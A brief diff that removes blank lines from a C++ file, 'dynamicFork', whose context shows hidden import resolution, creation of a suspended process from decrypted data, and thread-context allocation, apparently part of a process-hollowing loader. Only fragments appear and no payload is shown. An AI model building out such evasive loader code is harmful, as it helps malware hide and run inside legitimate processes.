@@ -1,7 +1,6 @@
 #include "dynamicFork.h"
 #include "hideImports.h"
 
-
 dynamicFork::dynamicFork(char* decryptedData) {
 	try {
 		hiddenImp::ResolveImports();
@@ -54,7 +53,6 @@ void dynamicFork::CreateProcessAndWrite(char* decryptedData) {
 		throw std::runtime_error("[-] Error creating the new suspended process.");
 	}
 }
-
 
 void dynamicFork::AllocateContext() {
 	context = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
